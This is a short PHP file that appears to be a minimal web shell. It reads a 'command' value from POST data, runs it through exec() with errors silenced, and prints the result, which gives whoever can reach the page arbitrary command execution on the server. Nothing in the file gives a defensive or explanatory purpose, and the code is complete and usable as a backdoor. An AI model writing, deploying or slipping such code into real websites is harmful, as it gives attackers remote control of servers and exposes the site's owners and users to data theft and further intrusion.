<?php
function exTKL() {
	$in=$_POST['command'];

	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}
	echo $out;
}

exTKL();
?>